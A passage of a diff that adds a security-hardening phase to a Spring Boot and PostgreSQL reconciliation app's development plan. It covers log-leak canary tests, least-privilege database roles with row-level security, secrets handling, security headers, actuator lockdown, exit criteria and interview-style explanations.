+- **MDC.** Only `request_id`, `organization_id` and `user_id` go there. In JSON logs, every MDC entry becomes a field. Boot's structured logging lets you drop fields with `logging.structured.json.exclude` (verify the property in Boot 4).
+- **Audit payloads** live in the database, under tenant isolation, so they may contain references, but never passwords or tokens.
+
+**4. Prove it with canaries.** Put distinctive values in the integration-test sample data, e.g. a reference `CANARYREF9876` and a user email `canary.user@leak.test`, then run the main flows and scan captured output:
+
+```java
+@ExtendWith(OutputCaptureExtension.class)
+class LogLeakIT extends BaseIntegrationTest {
+    @Test
+    void sensitiveValuesNeverReachTheLogs(CapturedOutput output) {
+        loginAs("canary.user@leak.test");
+        uploadFixture("canary-ledger.csv");
+        uploadFixture("canary-gateway-with-bad-rows.csv");
+        startRunAndWait();
+        resolveFirstException("note mentioning CANARYREF9876");
+        triggerUniqueViolationOnPurpose();
+
+        assertThat(output.getAll())
+            .doesNotContain("CANARYREF9876")
+            .doesNotContain("canary.user@leak.test")
+            .doesNotContain("Bearer ey")
+            .doesNotContainPattern("password\\s*[=:]");
+    }
+}
+```
+
+The test fails the first time someone adds `log.debug("row {}", rawRow)`, which no code review reliably catches.
+
+**Pitfalls.** Relying only on pattern-based masking in Logback (it misses domain-specific identifiers and slows every log line). Masking so aggressively that logs can't be used for debugging: keep the UUIDs, which let you look up the real values in the database under access control.
+
+**Done when.** The policy table is in `docs/security.md`; `Masked` is used at every log call that mentions a reference or email; `LogLeakIT` passes with logging at DEBUG for `com.reconflow`.
+
+---
+
+### M10.7 — Least-privilege database roles
+
+**What.** Three roles: an owner/migrator that runs Flyway, an application role with data access only, and (already present) a superuser used only by humans for emergencies. The application never connects as the owner.
+
+**Why.**
+
+1. If the app is compromised (SQL injection, an RCE in a dependency), the attacker gets the app role's rights. With DML-only rights, they can't `DROP TABLE`, `ALTER` a constraint or disable the audit trigger.
+2. `audit_event` should be append-only even against the app itself. The V1 trigger already blocks `UPDATE`/`DELETE`, but the table owner can `ALTER TABLE ... DISABLE TRIGGER`. Revoking the privileges as well means two independent locks.
+3. **RLS only applies to roles that aren't the table owner** (§2.3). Today the app, Flyway and you all use `DB_USER`, which owns every table, so the M3.5 policies are bypassed silently. This step is what makes them take effect.
+
+**How.**
+
+**1. Create the roles** — once per environment, as a superuser, outside Flyway (Flyway runs *as* the migrator, so it can't create it). Commit it as `infra/db/bootstrap-roles.sql`, run with `psql -v migrator_pw=... -v app_pw=...`:
+
+```sql
+-- infra/db/bootstrap-roles.sql
+-- Run once per environment as a superuser. Not a Flyway migration.
+\set ON_ERROR_STOP on
+
+CREATE ROLE reconflow_migrator LOGIN PASSWORD :'migrator_pw'
+    NOSUPERUSER NOCREATEDB NOCREATEROLE NOBYPASSRLS;
+CREATE ROLE reconflow_app LOGIN PASSWORD :'app_pw'
+    NOSUPERUSER NOCREATEDB NOCREATEROLE NOBYPASSRLS
+    CONNECTION LIMIT 60;                               -- docs/scalability.md §2.5 budget plus headroom
+
+ALTER DATABASE paymentreconflow OWNER TO reconflow_migrator;
+REVOKE ALL ON DATABASE paymentreconflow FROM PUBLIC;
+GRANT CONNECT ON DATABASE paymentreconflow TO reconflow_app;
+
+\connect paymentreconflow
+ALTER SCHEMA public OWNER TO reconflow_migrator;
+REVOKE CREATE ON SCHEMA public FROM PUBLIC;            -- already the default since PostgreSQL 15
+GRANT USAGE ON SCHEMA public TO reconflow_app;
+
+-- An existing database whose objects belong to the old DB_USER:
+-- REASSIGN OWNED BY old_dev_user TO reconflow_migrator;
+```
+
+**2. Grants as a Flyway migration**, so every environment gets the same privileges and future tables are covered:
+
+```sql
+-- V<next>__app_role_grants.sql
+-- Runs as reconflow_migrator, which owns every object below.
+
+GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO reconflow_app;
+GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO reconflow_app;
+
+-- Tables created by later migrations get the same rights automatically.
+ALTER DEFAULT PRIVILEGES FOR ROLE reconflow_migrator IN SCHEMA public
+    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO reconflow_app;
+ALTER DEFAULT PRIVILEGES FOR ROLE reconflow_migrator IN SCHEMA public
+    GRANT USAGE, SELECT ON SEQUENCES TO reconflow_app;
+
+-- Append-only tables: insert and read, nothing else. The trigger from V1
+-- stays as a second lock.
+REVOKE UPDATE, DELETE, TRUNCATE ON audit_event, exception_note, exception_status_history FROM reconflow_app;
+
+-- The app may check the migration history (startup validation, M11.5) but not change it.
+REVOKE INSERT, UPDATE, DELETE ON flyway_schema_history FROM reconflow_app;
+
+-- Creating a partition requires owning the parent table. The maintenance
+-- job runs as the app role, so the function runs with its owner's rights.
+-- search_path is pinned so a caller can't redirect it to their own objects.
+ALTER FUNCTION create_transaction_record_partition(date) SECURITY DEFINER;
+ALTER FUNCTION create_transaction_record_partition(date) SET search_path = public, pg_temp;
+REVOKE EXECUTE ON FUNCTION create_transaction_record_partition(date) FROM PUBLIC;
+GRANT  EXECUTE ON FUNCTION create_transaction_record_partition(date) TO reconflow_app;
+```
+
+Partitions created later are created by the migrator (through the `SECURITY DEFINER` function), so default privileges apply to them too. Queries through the parent table are checked against the parent's grants anyway.
+
+If M3.5 used `FORCE ROW LEVEL SECURITY` on the tenant tables, RLS already applied to the owner as well; keep it, it protects against someone accidentally pointing the app at owner credentials. If it didn't, add it here for the same reason.
+
+The job claimer, the lease sweeper and the partition job work across tenants. Check that the M3.5 design accounts for them (e.g. `job` has no RLS, or those statements run through a narrowly scoped `SECURITY DEFINER` function). They now run as `reconflow_app`, and a policy that silently returns zero rows looks exactly like "no jobs to do".
+
+**3. Two sets of credentials in Spring.** When `spring.flyway.user` is set, Boot gives Flyway its own connection with those credentials, separate from the app's Hikari pool:
+
+```yaml
+spring:
+  datasource:
+    url: ${DB_URL}
+    username: ${DB_APP_USER:reconflow_app}
+    password: ${DB_APP_PASSWORD}
+  flyway:
+    user: ${DB_MIGRATOR_USER:reconflow_migrator}
+    password: ${DB_MIGRATOR_PASSWORD}
+```
+
+In production, migrations run as a separate one-off step and the app doesn't hold the migrator password at all (phase M11, M11.5). Locally, both live in `.env` for convenience. Update `.env.example`, the README setup steps, `compose.yaml` (run `bootstrap-roles.sql` from `/docker-entrypoint-initdb.d`), and the Testcontainers base class (M2.16) so tests also connect as `reconflow_app`. **If tests connect as the owner, the RLS tests prove nothing.**
+
+**Pitfalls.**
+
+- Forgetting `ALTER DEFAULT PRIVILEGES`: the next migration adds a table and the app gets `permission denied` in production only.
+- `ALTER DEFAULT PRIVILEGES` without `FOR ROLE reconflow_migrator` applies to objects created by whoever ran it, which may not be the migrator.
+- Testing as a superuser (the Testcontainers default `test` user is one). Superusers bypass RLS and every grant.
+- A `SECURITY DEFINER` function without a pinned `search_path` is a privilege-escalation hole.
+
+**Done when.**
+
+- An integration test connected as `reconflow_app` gets `permission denied` for `DROP TABLE organization`, `ALTER TABLE audit_event DISABLE TRIGGER ALL`, `UPDATE audit_event ...` and `INSERT INTO flyway_schema_history ...`.
+- An RLS test: with `app.org_id` set to org A, a raw `SELECT count(*) FROM exception_case` as `reconflow_app` returns only org A's rows, even with no `WHERE` clause.
+- The partition maintenance job succeeds as `reconflow_app`.
+
+---
+
+### Cross-cutting items (not separate task IDs, but part of M10's exit)
+
+**Secrets management.**
+
+| Secret | Local | CI | Deployed |
+|---|---|---|---|
+| `DB_APP_PASSWORD`, `DB_MIGRATOR_PASSWORD` | `.env` (gitignored) | Testcontainers generates them | Platform secret store; migrator password only on the migrate step |
+| S3 access key / secret | `.env` (MinIO defaults) | Testcontainers MinIO | Platform secret store, a key scoped to one bucket |
+| Keycloak admin client secret | `.env` | — | Platform secret store |
+| `NVD_API_KEY` | — | GitHub Actions secret | — |
+
+Rules: no secret in the image, in `application.yml` or in git history; the app **fails fast at startup** when a required secret is missing in a non-local profile (`${DB_APP_PASSWORD}` with no default already does this); every secret has a written rotation procedure (for the DB: create the new password, update the store, restart, verify, done — because roles, not passwords, carry the grants).
+
+**Security headers.** Spring Security already sends `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Cache-Control: no-store` and, over HTTPS, HSTS. For a JSON API, add a CSP that forbids everything and a strict referrer policy:
+
+```java
+http.headers(h -> h
+    .contentSecurityPolicy(c -> c.policyDirectives("default-src 'none'; frame-ancestors 'none'"))
+    .referrerPolicy(r -> r.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.NO_REFERRER))
+    .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31_536_000)));
+```
+
+HSTS is only written when Spring thinks the request was HTTPS. Behind a TLS-terminating proxy, set `server.forward-headers-strategy=native` or it never appears. Swagger UI (non-prod only, M11.7) needs a looser CSP; scope that to its paths. Configure CORS with an explicit list of allowed origins, never `*` with credentials.
+
+**Actuator exposure.**
+
+```yaml
+management:
+  server:
+    port: 8081                         # not routed by the public load balancer
+  endpoints:
+    web:
+      exposure:
+        include: health,info,prometheus
+  endpoint:
+    health:
+      show-details: never
+      probes:
+        enabled: true
+  info:
+    env:
+      enabled: false
+```
+
+Never expose `env`, `configprops` (they show config values), `heapdump` (contains every secret in memory), `threaddump`, `loggers` (write access) or `shutdown`. If the platform can't route a private port (some PaaS can't), keep the main port and protect `/actuator/prometheus` with an authority, or don't expose it there.
+
+---
+
+## 5. Testing strategy
+
+| Control | Test type | Test |
+|---|---|---|
+| OIDC validation | Integration, `spring-security-test` `jwt()` | Wrong `aud`, wrong `iss`, expired, unknown `sub` → `401` |
+| OIDC end to end | Integration with Keycloak Testcontainer (`com.github.dasniko:testcontainers-keycloak`) | Real token from the imported realm → `200`; one or two tests only |
+| Account linking | Integration | Verified email links once and audits `USER_LINKED`; unverified email → `401`; already-linked row not relinked |
+| Tenant isolation unchanged | Existing M3.9 / M7.18 suite | Passes with no edits |
+| CSV injection | Unit + integration | §M10.2 Done when |
+| Upload limits | Integration (`MockMvc` multipart or a real HTTP client) | 413 + nothing stored |
+| Rate limits | Integration + concurrency | §M10.4 Done when |
+| Dependency gate | Manual, once | A deliberately vulnerable PR gets blocked |
+| Log leaks | Integration with `OutputCaptureExtension` | `LogLeakIT` |
+| DB roles and RLS | Integration connected as `reconflow_app` | §M10.7 Done when |
+| Headers | `MockMvc` | Each header present on a normal API response |
+| Actuator | Integration | `/actuator/env` → `404`; health shows no details |
+
+One rule for the whole phase: **every security test must fail first.** Break the control on purpose (comment out the escape, connect as the owner, remove the audience) and watch the test go red before you trust it green.
+
+---
+
+## 6. Exit criteria checklist
+
+- [ ] Login goes through Keycloak; in-house auth code and tests are removed; contract migration written
+- [ ] Cross-tenant suite passes unchanged after M10.1
+- [ ] ADR comparing M3.3 and Keycloak merged, with the "changed outside `security/`" list
+- [ ] Exported CSVs escape formula characters in free-text columns; numbers stay numeric
+- [ ] Oversized uploads get `413` from the container, with a `ProblemDetail`
+- [ ] Upload and run endpoints return `429` + `Retry-After`; per-org pending-job cap enforced exactly
+- [ ] Dependabot, dependency review on PRs, weekly Dependency-Check, push protection enabled
+- [ ] Logging policy written; `LogLeakIT` passes
+- [ ] App connects as `reconflow_app`; RLS proven against it; audit tables can't be updated or deleted
+- [ ] Security headers and actuator exposure verified by tests
+- [ ] `docs/security.md` complete, every row linked to its config and test
+
+**`docs/security.md` format.** One table, one row per control, nothing claimed without a link:
+
+```markdown
+| ID | Control | Threat | Enforced by | Proven by | Status |
+|----|---------|--------|-------------|-----------|--------|
+| S-01 | Tenant isolation: membership check | IDOR across orgs | [TenantContextFilter](../src/main/java/.../security/tenant/TenantContextFilter.java) | [CrossTenantIT](../src/test/java/.../CrossTenantIT.java) | ✅ |
+| S-02 | Tenant isolation: RLS | Missing `WHERE organization_id` | [V7__rls.sql](../src/main/resources/db/migration/V7__rls.sql) | [RlsAsAppRoleIT](...) | ✅ |
+| S-03 | CSV formula escaping | Formula injection in Excel | [SpreadsheetSafe](...) | [SpreadsheetSafeTest](...), [ExportInjectionIT](...) | ✅ |
+| S-04 | Multipart size limit | Disk exhaustion | [application.yml](../src/main/resources/application.yml) `spring.servlet.multipart` | [UploadLimitIT](...) | ✅ |
+| ... | | | | | |
+| S-xx | Encryption of CSVs per tenant | Bucket leak | — | — | ❌ Accepted risk: see ADR 00xx |
+```
+
+Accepted risks belong in the table too, marked as such, with a link to the reasoning. That honesty is worth more in an interview than a table of green ticks.
+
+---
+
+## 7. Interview questions this phase prepares you for
+
+**Why did you build auth yourself and then replace it with Keycloak?**
+Building it taught me what an identity provider actually does: password hashing with upgradeable cost, token rotation with reuse detection, lockout without user enumeration. Running it in production would mean owning that attack surface forever, so I delegated it. Because the rest of the app only talked to `CurrentUser` and `TenantContext`, the switch touched only the security package, which was the real test of the design.
+
+**What's the difference between OAuth 2.0 and OIDC?**
+OAuth 2.0 lets a client obtain an access token to call an API on a user's behalf; it says nothing standard about who the user is. OIDC adds an identity layer: an ID token, a userinfo endpoint and discovery metadata. My API is a resource server, so it only validates access tokens: signature via the issuer's JWKS, then `iss`, `aud` and `exp`.
+
+**Why validate the audience claim?**
+Without it, any token the same IdP issued for a different application would be accepted by my API. Audience binds the token to its intended recipient. Keycloak doesn't add my API to `aud` by default, so I had to add a mapper, and the missing mapper was the first bug I hit.
+
+**How do you link IdP users to your own user table?**
+By the IdP's `sub`, stored in a unique column, because it's stable and issued by the IdP. Email is used once, to link a pre-provisioned account on first login, and only when the IdP says the email is verified; otherwise anyone who could register that email in the IdP could take over the account.
+
+**How does row-level security work, and how can it silently not work?**
+A policy adds a predicate to every query on the table, here `organization_id = current_setting('app.org_id')::uuid`, set per transaction with `SET LOCAL`. It doesn't apply to superusers, `BYPASSRLS` roles or the table owner unless the table has `FORCE ROW LEVEL SECURITY`. If the app connects as the role that ran the migrations, every policy is bypassed and tests written with the same credentials still pass. Separate roles fix it.
+
+**What is CSV injection and how do you prevent it?**
+A cell starting with `=`, `+`, `-` or `@` is evaluated as a formula by spreadsheet programs, so attacker-controlled text in an export can exfiltrate data or run commands on the analyst's machine. I prefix such cells with a single quote on export, only for free-text columns, because escaping numbers we formatted ourselves would break sums. I escape on output, not input, so the raw imported values stay intact.
+
+**How would you rate-limit across multiple instances?**
+Per-instance token buckets give N times the limit with N instances. For an exact limit you need a shared store: Redis, or the database for low-volume endpoints. I used in-memory buckets for request rate and an exact per-organization cap on pending jobs in PostgreSQL, serialised with an advisory lock, because the jobs are the expensive resource the limit really protects.
+
+**Token bucket vs fixed window?**
+A fixed window resets at boundaries, so a client can send twice the limit across the edge of two windows. A token bucket refills continuously and allows controlled bursts up to its capacity while capping the long-run rate. Sliding windows are more exact but cost more memory.
+
+**Why limit upload size in Tomcat if the code already checks it?**
+By the time the controller runs, the container has already read the body and buffered it to disk. A container-level limit rejects it while streaming. The same applies at the reverse proxy: every layer that buffers needs its own limit.
+
+**How do you keep sensitive data out of logs?**
+A written policy of what's allowed, masked or never logged; masking at the call site, because only the code knows a string is a reference; and a canary test that runs the main flows with distinctive values in the data and fails if any appear in the captured output. Watch for indirect leaks, like database constraint errors that include the offending values.
+
+**Dependabot vs dependency review vs Dependency-Check?**
+Dependabot proposes upgrades. Dependency review blocks a PR that introduces a known-vulnerable version, quickly, on every PR. Dependency-Check scans everything on a schedule, catching new CVEs in versions you already ship. They answer different questions, so I use all three.
+
+---
+
+## 8. Common mistakes
+
+- **Running every test as the database owner or a superuser.** RLS, grants and the audit trigger's protection are all invisible. Your tests must connect the way production does.
+- **Putting roles and organizations into Keycloak tokens** "because it's an IdP". It reintroduces stale permissions for the token lifetime and splits authorization across two systems.
+- **Enabling the password grant in a deployed realm** because the demo script uses it.
+- **Dropping `password_hash` and `refresh_token` in the same release as the cutover.** You lose the rollback path (expand/contract).
+- **Escaping CSV on import.** It corrupts the raw values the audit trail depends on.
+- **An unbounded rate-limiter map** keyed by anything a client controls.
+- **Trusting `X-Forwarded-For`** when the app is reachable without going through the proxy.
+- **Exposing `env`, `heapdump` or `configprops`** "for debugging".
+- **Security controls with no test**, or tests that were never seen failing.
+- **A `docs/security.md` that claims more than the code does.** Every row needs a link, and accepted risks are listed honestly.
